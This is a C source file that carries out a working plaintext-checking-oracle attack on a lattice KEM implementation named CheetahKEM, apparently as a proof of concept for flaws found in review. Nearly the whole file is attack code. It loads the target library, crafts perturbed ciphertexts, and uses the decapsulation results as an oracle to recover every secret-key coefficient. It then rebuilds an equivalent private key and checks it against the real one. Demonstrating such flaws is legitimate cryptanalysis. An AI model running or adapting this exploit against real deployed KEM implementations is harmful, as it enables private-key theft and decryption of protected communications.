/* CheetahKEM (kem-09) plaintext-checking-oracle secret-key recovery.
 *
 * Escalates kem-09-4.  kem_dec binds the implicit-rejection key to the
 * re-encryption of the decrypted message (kem-09-4) and selects it with a
 * partial, non-normalised mask (kem-09-1); together they expose a
 * plaintext-checking oracle.  The library is used only as a black box through
 * the uniform ABI (ngcc_seed, kem_keygen, kem_enc, kem_dec) loaded with dlopen.
 * The attack never links the submission's internal decrypt.
 * The coefficient-boundary method is adapted from the ML-KEM plaintext-checking-
 * oracle key-recovery experiments.  The final check rebuilds an
 * equivalent decapsulation key from pk and the recovered secret alone (SM3(pk),
 * zero fallback salt); the original sk is used only by the oracle and for the
 * coefficient comparison.
 *
 * Modes:  adaptive  = sequential, early-stops each coordinate's probe sweep.
 *         static    = fixed non-adaptive query batch, run across fork() workers.
 * The NTT tables (N=640 ring) are embedded only to re-encode the recovered
 * secret for the end-to-end check and to compare against the parsed key; they
 * are not used while querying the oracle.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include "cheetah_ntt_tables.h"

typedef int (*keygen_fn)(unsigned char*,unsigned long long*,unsigned char*,unsigned long long*);
typedef int (*enc_fn)(unsigned char*,unsigned long long,unsigned char*,unsigned long long*,unsigned char*,unsigned long long*);
typedef int (*dec_fn)(unsigned char*,unsigned long long,unsigned char*,unsigned long long,unsigned char*,unsigned long long*);
typedef int (*seed_fn)(const unsigned char*,unsigned long long);
typedef unsigned long long (*len_fn)(void);

static keygen_fn kem_keygen; static enc_fn kem_enc; static dec_fn kem_dec; static seed_fn ngcc_seed;
static int PKL,SKL,CTL,SSL;

typedef struct { const char*name; int K,Q,QBITS,DU,DV,nv,eta; } Params;
static Params SETS[] = {
 {"Cheetah128",1,7681,13,10,4,128,5},
 {"Cheetah256",2,7681,13,10,4,256,4},
 {"Cheetah384",3,7681,13,11,4,384,3},
 {"Cheetah512",4,7681,13,11,8,512,2},
};
#define N 640

/* ---- bit (de)serialise, LSB-first (matches every Cheetah encoder) ---- */
static void unpackbits(const unsigned char*b,int n,int d,int*out){
    int bit=0;
    for(int i=0;i<n;i++){int v=0;for(int j=0;j<d;j++){v|=((b[bit>>3]>>(bit&7))&1)<<j;bit++;}out[i]=v;}
}
static void packbits(const int*vals,int n,int d,unsigned char*out){
    int nb=(n*d+7)>>3; memset(out,0,nb); int bit=0;
    for(int i=0;i<n;i++){for(int j=0;j<d;j++){if((vals[i]>>j)&1)out[bit>>3]|=1<<(bit&7);bit++;}}
}

/* ---- NTT over the N=640 ring (verification only) ---- */
static int Qg;
static int mq(long long x){ long long r=x%Qg; if(r<0)r+=Qg; return (int)r; }
static void ntt5(int*a,int idx,int st,int fwd){
    long long s[5]; for(int t=0;t<5;t++)s[t]=a[idx+t*st];
    static const int cf[5][5]={{1,1,1,1,1},{1,4143,5095,1197,4926},{1,5095,4926,4143,1197},{1,1197,4143,4926,5095},{1,4926,1197,5095,4143}};
    static const int ci[5][5]={{1,1,1,1,1},{1,4926,1197,5095,4143},{1,1197,4143,4926,5095},{1,5095,4926,4143,1197},{1,4143,5095,1197,4926}};
    for(int r=0;r<5;r++){long long acc=0;for(int c=0;c<5;c++)acc+=(long long)(fwd?cf[r][c]:ci[r][c])*s[c];a[idx+r*st]=mq(acc);}
}
static void ntt128(int*a,int off,int fwd){
    int b[128]; for(int i=0;i<128;i++)b[i]=a[off+BREV[i]];
    const int32_t*tw=fwd?W1POW:W1IPOW;
    for(int m=1;m<=7;m++){int step=1<<m,half=step>>1,ts=128>>m;
        for(int i=0;i<128;i+=step)for(int j=0;j<half;j++){int i1=i+j,i2=i1+half;int uu=mq((long long)b[i2]*tw[ts*j]);b[i2]=b[i1]+Qg-uu;b[i1]=b[i1]+uu;}}
    for(int i=0;i<128;i++)a[off+i]=mq(b[i]);
}
static void ntt640(int*x,int fwd){
    if(fwd)for(int i=0;i<N;i++)x[i]=mq((long long)PSI_POW[i]*x[i]);
    int mat[N]; for(int i=0;i<N;i++)mat[i]=x[CTR_MAP[i]];
    for(int n2=0;n2<5;n2++)ntt128(mat,n2*128,fwd);
    for(int n1=0;n1<128;n1++)ntt5(mat,n1,128,fwd);
    for(int i=0;i<N;i++)x[CTR_MAP[i]]=mat[i];
    if(!fwd)for(int i=0;i<N;i++)x[i]=mq((long long)INVPSI_POW[i]*x[i]);
}

/* ---- globals describing the target instance ---- */
static Params P;
static int M,ustep,vshift,ucmax,ulen,ubytes,NP;
static int PR[64];                 /* probe v-code deltas */
static int V1TAB[512];             /* decompressed v per code */
static unsigned char BASECT[8192]; /* base ciphertext */
static unsigned char KSTAR[128], C0[128];
static int ubase[2560], vbase[640];
static unsigned char *g_sk;        /* for oracle only via dec(sk,ct) */
static long long qcount=0, setupq=0;

static int v1code(int cd){ long long t=((long long)(cd%M)<<vshift)+(1<<(vshift-1)); return (t>=Qg-1)?(Qg-1):(int)t; }
static int msgbit(long long w){ w%=Qg; if(w<0)w+=Qg; long long x=(2*w)%Qg; if(x>(Qg-1)/2)x-=Qg; return (int)(x&1); }

static int predbit_model(int vb,int T0,int sc,int D,int d){
    int b0=msgbit(V1TAB[vb%M]-T0);
    return msgbit((long long)V1TAB[(vb+d)%M]-(T0+(long long)D*sc))==b0?1:0;
}

/* decapsulate a ciphertext and return the PCO predicate bit (m'==m) */
static int oracle(const unsigned char*ct){
    unsigned char ss[128]; unsigned long long sl=SSL;
    qcount++;
    kem_dec(g_sk,SKL,(unsigned char*)ct,CTL,ss,&sl);
    int fail=0; for(int i=0;i<CTL;i++) fail|=ct[i]^BASECT[i];
    unsigned char mask=(unsigned char)(-fail);
    for(int i=0;i<SSL;i++){ unsigned char exp=KSTAR[i]^(mask&(C0[i]^KSTAR[i])); if(ss[i]!=exp) return 0; }
    return 1;
}
/* build ct for (u patched at pos->code, v coord swept to vb+d) and query */
static int query(int upos,int ucode,int coord,int d,unsigned char*scratch){
    int uu[2560]; memcpy(uu,ubase,ulen*sizeof(int));
    if(upos>=0) uu[upos]=ucode;
    int vv[640]; memcpy(vv,vbase,P.nv*sizeof(int));
    vv[coord]=(vbase[coord]+d)%M;
    packbits(uu,ulen,P.DU,scratch);
    packbits(vv,P.nv,P.DV,scratch+ubytes);
    return oracle(scratch);
}

/* ---- settings: base + (component,block,dc) perturbations, adaptive dc ---- */
typedef struct { int upos; int ucode; } Setting;    /* ucode absolute perturbed code */
static Setting SET[4096]; static int NSET;
static int SET_k[4096], SET_start[4096], SET_D[4096]; /* metadata per setting */

static void build_settings(){
    NSET=0;
    for(int k=0;k<P.K;k++){
        for(int start=0;start<N;start+=P.nv){
            int p=((-start)%N+N)%N; int pos=k*N+p; int bc=ubase[pos];
            int Dcand[6]={64,128,192,256,384,512}; int Dtar[6]; int ntar=0;
            for(int t=0;t<6;t++){ if(Dcand[t]*P.eta<=1600) Dtar[ntar++]=Dcand[t]; }
            if(ntar<2){ Dtar[0]=128; Dtar[1]=256; ntar=2; }
            for(int t=0;t<ntar;t++){
                int m=Dtar[t]/ustep; if(m==0)continue;
                if(bc+m<=ucmax){ SET[NSET].upos=pos; SET[NSET].ucode=bc+m; SET_k[NSET]=k; SET_start[NSET]=start; SET_D[NSET]=+m*ustep; NSET++; }
                if(bc-m>=1){ SET[NSET].upos=pos; SET[NSET].ucode=bc-m; SET_k[NSET]=k; SET_start[NSET]=start; SET_D[NSET]=-m*ustep; NSET++; }
            }
        }
    }
}

/* ---- solve one coordinate from observed base bits + list of (D,bits) ---- */
static int T0cand[8192], nT0;
static void narrow_T0(int vb,const int*basebits){
    nT0=0;
    for(int T0=0;T0<Qg;T0++){
        int ok=1;
        for(int pi=0;pi<NP;pi++){ if(predbit_model(vb,T0,0,0,PR[pi])!=basebits[pi]){ok=0;break;} }
        if(ok) T0cand[nT0++]=T0;
    }
}
/* return unique sc or -999 */
static int solve_coord(int vb,const int*basebits,int nobs,const int*Ds,const int*obsbits){
    narrow_T0(vb,basebits);
    int found=-999,count=0;
    for(int sc=-P.eta;sc<=P.eta;sc++){
        int any=0;
        for(int ti=0;ti<nT0 && !any;ti++){int T0=T0cand[ti];
            int good=1;
            for(int o=0;o<nobs && good;o++){
                const int*ob=obsbits+o*NP; int D=Ds[o];
                for(int pi=0;pi<NP;pi++){ if(predbit_model(vb,T0,sc,D,PR[pi])!=ob[pi]){good=0;break;} }
            }
            if(good)any=1;
        }
        if(any){found=sc;count++;}
    }
    return count==1?found:-999;
}

/* index map: setting covers outputs i; output i -> secret (idx,sign) */
static void map_output(int start,int i,int*idx,int*sign){
    int p=((-start)%N+N)%N; int raw=i-p; *sign=(raw>=0)?1:-1; *idx=((raw%N)+N)%N;
}

static int SECRET[2560];   /* recovered coeff-domain secret, K*N */
static int DONE[2560];
static int g_fail=0, g_nbad=0;


/* deterministic adaptive mop-up for any coordinate left unresolved by the batch */
static int mop_one(int k,int idx){
    unsigned char scr[8192];
    int obs[128*64],Ds[128],nobs=0,base[64],bhave=0,sc=-999;
    int mags[12]={16,32,48,64,96,128,160,192,224,256,288,320};
    for(int start=0;start<N && sc==-999;start+=P.nv){
        int p=((-start)%N+N)%N; int i=((idx+p)%N+N)%N; if(i<0||i>=P.nv)continue;
        int sign; { int raw=i-p; sign=(raw>=0)?1:-1; }
        int pos=k*N+p, bc=ubase[pos];
        if(!bhave){ for(int pi=0;pi<NP;pi++)base[pi]=query(-1,0,i,PR[pi],scr); bhave=1; }
        for(int t=0;t<12;t++){ int m=mags[t]/ustep; if(m==0||mags[t]*P.eta>1700)continue;
            for(int si=0;si<2;si++){ int dd=si?-m:+m; int code=bc+dd; if(code<1||code>ucmax)continue;
                int tmp[64],any=0; for(int pi=0;pi<NP;pi++){tmp[pi]=query(pos,code,i,PR[pi],scr);any|=tmp[pi];}
                if(!any)continue; for(int pi=0;pi<NP;pi++)obs[nobs*NP+pi]=tmp[pi]; Ds[nobs]=sign*dd*ustep; nobs++; }
            sc=solve_coord(vbase[i],base,nobs,Ds,obs); if(sc!=-999)break; }
        /* note: base[] is tied to this block's output i; reset for next block */
        bhave=0; nobs=0;
    }
    return sc;
}
static void mop_up(){
    for(int k=0;k<P.K;k++)for(int idx=0;idx<N;idx++) if(!DONE[k*N+idx]){int sc=mop_one(k,idx); if(sc!=-999){SECRET[k*N+idx]=sc;DONE[k*N+idx]=1;}}
}

/* ---- STATIC parallel batch ---- */
static void run_static(int nworkers){
    long long baseN=(long long)P.nv*NP;
    long long ndesc=(1+NSET)*baseN;
    unsigned char *bits=mmap(NULL,ndesc,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,-1,0);
    long long *qc=mmap(NULL,sizeof(long long)*nworkers,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,-1,0);
    if(nworkers<1)nworkers=1;
    for(int w=0;w<nworkers;w++){
        pid_t pid=fork();
        if(pid==0){
            unsigned char scratch[8192]; long long my=0;
            for(long long di=w; di<ndesc; di+=nworkers){
                long long s=di/baseN; long long rem=di%baseN; int coord=rem/NP, pi=rem%NP;
                int upos,ucode;
                if(s==0){upos=-1;ucode=0;} else {upos=SET[s-1].upos;ucode=SET[s-1].ucode;}
                bits[di]=(unsigned char)query(upos,ucode,coord,PR[pi],scratch);
                my++;
            }
            qc[w]=my; _exit(0);
        }
    }
    for(int w=0;w<nworkers;w++) wait(NULL);
    for(int w=0;w<nworkers;w++) qcount+=qc[w];
    /* solve */
    for(int k=0;k<P.K;k++)for(int i=0;i<N;i++){SECRET[k*N+i]=0;DONE[k*N+i]=0;}
    int basebits[64], obsbits[16*64], Ds[16];
    for(int k=0;k<P.K;k++){
        for(int start=0;start<N;start+=P.nv){
            for(int i=0;i<P.nv;i++){
                int idx,sign; map_output(start,i,&idx,&sign);
                if(DONE[k*N+idx])continue;
                for(int pi=0;pi<NP;pi++) basebits[pi]=bits[(long long)i*NP+pi];
                int nobs=0;
                for(int s=0;s<NSET;s++){ if(SET_k[s]!=k||SET_start[s]!=start)continue;
                    int tmp[64],any=0; for(int pi=0;pi<NP;pi++){tmp[pi]=bits[(long long)(s+1)*baseN + (long long)i*NP + pi]; any|=tmp[pi];}
                    if(!any) continue;   /* all-zero obs: another coordinate flipped under this perturbation; drop */
                    for(int pi=0;pi<NP;pi++) obsbits[nobs*NP+pi]=tmp[pi];
                    Ds[nobs]=sign*SET_D[s]; nobs++;
                }
                int sc=solve_coord(vbase[i],basebits,nobs,Ds,obsbits);
                if(sc!=-999){SECRET[k*N+idx]=sc;DONE[k*N+idx]=1;}
            }
        }
    }
    munmap(bits,ndesc); munmap(qc,sizeof(long long)*nworkers);
    mop_up();
}

/* ---- SM3 (GB/T 32905), used only to compute H(pk) for the rebuilt key ---- */
#define ROL32(x,n) (((x)<<((n)&31))|((x)>>((32-((n)&31))&31)))
static void sm3_compress(uint32_t V[8],const unsigned char*B){
    uint32_t W[68],W1[64];
    for(int j=0;j<16;j++)W[j]=((uint32_t)B[4*j]<<24)|((uint32_t)B[4*j+1]<<16)|((uint32_t)B[4*j+2]<<8)|B[4*j+3];
    for(int j=16;j<68;j++){uint32_t x=W[j-16]^W[j-9]^ROL32(W[j-3],15);W[j]=(x^ROL32(x,15)^ROL32(x,23))^ROL32(W[j-13],7)^W[j-6];}
    for(int j=0;j<64;j++)W1[j]=W[j]^W[j+4];
    uint32_t A=V[0],Bb=V[1],C=V[2],D=V[3],E=V[4],F=V[5],G=V[6],H=V[7];
    for(int j=0;j<64;j++){
        uint32_t T=j<16?0x79cc4519u:0x7a879d8au;
        uint32_t SS1=ROL32(ROL32(A,12)+E+ROL32(T,j),7),SS2=SS1^ROL32(A,12);
        uint32_t FF=j<16?(A^Bb^C):((A&Bb)|(A&C)|(Bb&C)),GG=j<16?(E^F^G):((E&F)|(~E&G));
        uint32_t TT1=FF+D+SS2+W1[j],TT2=GG+H+SS1+W[j];
        D=C;C=ROL32(Bb,9);Bb=A;A=TT1;H=G;G=ROL32(F,19);F=E;E=TT2^ROL32(TT2,9)^ROL32(TT2,17);
    }
    V[0]^=A;V[1]^=Bb;V[2]^=C;V[3]^=D;V[4]^=E;V[5]^=F;V[6]^=G;V[7]^=H;
}
static void sm3(const unsigned char*m,size_t n,unsigned char out[32]){
    uint32_t V[8]={0x7380166f,0x4914b2b9,0x172442d7,0xda8a0600,0xa96f30bc,0x163138aa,0xe38dee4d,0xb0fb0e4e};
    size_t i=0; for(;i+64<=n;i+=64)sm3_compress(V,m+i);
    unsigned char blk[128]; size_t r=n-i; memset(blk,0,128); memcpy(blk,m+i,r); blk[r]=0x80;
    size_t L=(r+9<=64)?64:128; uint64_t bits=(uint64_t)n*8;
    for(int k=0;k<8;k++)blk[L-1-k]=(unsigned char)(bits>>(8*k));
    sm3_compress(V,blk); if(L==128)sm3_compress(V,blk+64);
    for(int k=0;k<8;k++){out[4*k]=V[k]>>24;out[4*k+1]=V[k]>>16;out[4*k+2]=V[k]>>8;out[4*k+3]=V[k];}
}
/* Equivalent decapsulation key built only from public data and the recovered
 * secret: enc(secret) || pk || SM3(pk) || zero fallback salt.  Nothing is
 * copied from the original sk. */
static unsigned char*build_sk(const unsigned char*pk,const int*enc,int ncoeff,int bits){
    unsigned char*s=calloc(SKL,1); int noise=(ncoeff*bits+7)/8;
    packbits(enc,ncoeff,bits,s); memcpy(s+noise,pk,PKL); sm3(pk,PKL,s+noise+PKL);
    int salt=SKL-noise-PKL-32;   /* fallback salt is SEED_BYTES: 32..80 by set; left zero */
    if(salt<32||salt>80){fprintf(stderr,"unexpected sk layout\n");exit(2);}
    return s;
}

/* ---- verification: compare to true key, end-to-end re-decapsulation, control ---- */
static int verify(unsigned char*sk,unsigned char*pk){
    int ncoeff=P.K*N;
    /* true coeff secret = INTT(stored NTT secret), 13-bit packed in sk[0:] */
    int sraw[2560]; unpackbits(sk,ncoeff,13,sraw);
    int nbad=0;
    for(int k=0;k<P.K;k++){
        int comp[N]; for(int i=0;i<N;i++)comp[i]=sraw[k*N+i];
        ntt640(comp,0);              /* inverse */
        for(int i=0;i<N;i++){ int tv=comp[i]; if(tv>Qg/2)tv-=Qg; if(SECRET[k*N+i]!=tv)nbad++; }
    }
    g_nbad=nbad;
    /* rebuild an equivalent key from pk and the recovered secret only (forward NTT -> 13-bit) */
    int rec[2560];
    for(int k=0;k<P.K;k++){ int comp[N]; for(int i=0;i<N;i++){int v=SECRET[k*N+i];v%=Qg;if(v<0)v+=Qg;comp[i]=v;} ntt640(comp,1); for(int i=0;i<N;i++)rec[k*N+i]=comp[i]; }
    unsigned char *skp=build_sk(pk,rec,ncoeff,13);
    unsigned char ct2[8192],ss2[128],ssr[128],sst[128]; unsigned long long a=CTL,b=SSL;
    kem_enc(pk,PKL,ss2,&b,ct2,&a);
    unsigned long long s1=SSL,s2=SSL; kem_dec(sk,SKL,ct2,CTL,sst,&s1); kem_dec(skp,SKL,ct2,CTL,ssr,&s2);
    int e2e=(memcmp(ssr,ss2,SSL)==0 && memcmp(sst,ss2,SSL)==0);
    /* control: corrupt one recovered coeff -> must fail */
    int bad[2560]; memcpy(bad,SECRET,sizeof(int)*ncoeff); bad[0]+=1;
    int recb[2560];
    for(int k=0;k<P.K;k++){ int comp[N]; for(int i=0;i<N;i++){int v=bad[k*N+i];v%=Qg;if(v<0)v+=Qg;comp[i]=v;} ntt640(comp,1); for(int i=0;i<N;i++)recb[k*N+i]=comp[i]; }
    unsigned char *skw=build_sk(pk,recb,ncoeff,13);
    unsigned char ssb[128]; unsigned long long s3=SSL; kem_dec(skw,SKL,ct2,CTL,ssb,&s3);
    int ctrl=(memcmp(ssb,ss2,SSL)!=0);
    free(skp);free(skw);
    printf("    key_match=%s rebuilt_key_redecaps=%s wrong_coeff_rejected=%s recovered=%d/%d (rebuilt key = recovered secret, pk, SM3(pk), zero salt)\n",
           nbad==0?"yes":"no", e2e?"yes":"no", ctrl?"yes":"no", ncoeff-nbad, ncoeff);
    return (nbad==0)&&e2e&&ctrl;
}

static void*must(void*h,const char*s){ void*p=dlsym(h,s); if(!p){fprintf(stderr,"missing symbol %s\n",s);exit(2);} return p; }

int main(int argc,char**argv){
    if(argc<3){fprintf(stderr,"usage: %s <lib.so> <SetName> [sequential|static] [nworkers]\n",argv[0]);return 2;}
    const char*libpath=argv[1]; const char*setname=argv[2];
    const char*mode=argc>3?argv[3]:"static"; int nw=argc>4?atoi(argv[4]):8;
    int si=-1; for(int i=0;i<4;i++) if(!strcmp(SETS[i].name,setname))si=i;
    if(si<0){fprintf(stderr,"unknown set %s\n",setname);return 2;}
    P=SETS[si]; Qg=P.Q; M=1<<P.DV; ustep=1<<(P.QBITS-P.DU); vshift=P.QBITS-P.DV;
    ucmax=((P.Q-1-(1<<(P.QBITS-P.DU-1)))>>(P.QBITS-P.DU))-1; ulen=P.K*N; ubytes=(ulen*P.DU)/8;
    for(int cd=0;cd<M;cd++)V1TAB[cd]=v1code(cd);
    /* probe points */
    if(M<=16){ NP=M; for(int d=0;d<M;d++)PR[d]=d; }
    else { int tmp[64],nt=0; int NPc=24; for(int d=0;d<NPc;d++)tmp[nt++]=(d*M)/NPc; tmp[nt++]=0;tmp[nt++]=1;
           /* sort+unique */ for(int a=0;a<nt;a++)for(int b=a+1;b<nt;b++)if(tmp[b]<tmp[a]){int t=tmp[a];tmp[a]=tmp[b];tmp[b]=t;}
           NP=0; for(int a=0;a<nt;a++) if(a==0||tmp[a]!=tmp[a-1]) PR[NP++]=tmp[a]; }

    void*h=dlopen(libpath,RTLD_NOW|RTLD_LOCAL);
    if(!h){fprintf(stderr,"dlopen failed: %s\n",dlerror());return 77;}
    kem_keygen=must(h,"kem_keygen");kem_enc=must(h,"kem_enc");kem_dec=must(h,"kem_dec");ngcc_seed=must(h,"ngcc_seed");
    len_fn pkl=must(h,"kem_get_pk_len_bytes"),skl=must(h,"kem_get_sk_len_bytes"),ctl=must(h,"kem_get_ct_len_bytes"),ssl=must(h,"kem_get_ss_len_bytes");
    PKL=pkl();SKL=skl();CTL=ctl();SSL=ssl();

    unsigned char seed[64]; for(int i=0;i<64;i++)seed[i]=(unsigned char)(0x5a^i^si); ngcc_seed(seed,64);
    unsigned char *pk=malloc(PKL),*sk=malloc(SKL); unsigned long long a=PKL,b=SKL;
    kem_keygen(pk,&a,sk,&b); g_sk=sk;
    unsigned long long cl=CTL,sl=SSL; kem_enc(pk,PKL,KSTAR,&sl,BASECT,&cl);
    unsigned char chk[128]; unsigned long long s0=SSL; kem_dec(sk,SKL,BASECT,CTL,chk,&s0);
    int honest=(memcmp(chk,KSTAR,SSL)==0);
    unpackbits(BASECT,ulen,P.DU,ubase); unpackbits(BASECT+ubytes,P.nv,P.DV,vbase);

    /* oracle constant C0 = H(salt||c*): majority of m-preserving bit-0 flips */
    int cnt[256]; unsigned char vals[256][128]; int nv2=0;
    int step=CTL/80; if(step<1)step=1;
    for(int j=0;j<CTL;j+=step){ unsigned char ct[8192]; memcpy(ct,BASECT,CTL); ct[j]^=1; unsigned char o[128]; unsigned long long s=SSL; kem_dec(sk,SKL,ct,CTL,o,&s);
        int f=-1; for(int t=0;t<nv2;t++) if(memcmp(vals[t],o,SSL)==0){f=t;break;}
        if(f<0){f=nv2;memcpy(vals[nv2],o,SSL);cnt[nv2]=0;nv2++;} cnt[f]++; qcount++; }
    int bst=0; for(int t=1;t<nv2;t++) if(cnt[t]>cnt[bst])bst=t; memcpy(C0,vals[bst],SSL);

    build_settings();
    printf("  %s: honest_decaps=%s  C0_cluster=%d  settings=%d  probes=%d\n",setname,honest?"yes":"no",cnt[bst],NSET,NP);

    struct timespec t0,t1; clock_gettime(CLOCK_MONOTONIC,&t0);
    setupq=qcount+1; qcount=0;   /* honest check + C0 identification are setup, reported separately */
    if(!strcmp(mode,"sequential")||!strcmp(mode,"adaptive")) run_static(1);
    else run_static(nw);
    clock_gettime(CLOCK_MONOTONIC,&t1);
    double dt=(t1.tv_sec-t0.tv_sec)+(t1.tv_nsec-t0.tv_nsec)/1e9;
    g_fail=0; for(int k=0;k<P.K;k++)for(int i=0;i<N;i++) if(!DONE[k*N+i]) g_fail++;
    int ok=verify(sk,pk);
    printf("  %s: mode=%s workers=%d setup_queries=%lld recovery_batch_queries=%lld unresolved=%d time=%.1fs\n",
           setname,mode,(!strcmp(mode,"sequential")||!strcmp(mode,"adaptive"))?1:nw,setupq,qcount,g_fail,dt);
    return (ok && g_fail==0 && honest)?0:1;
}
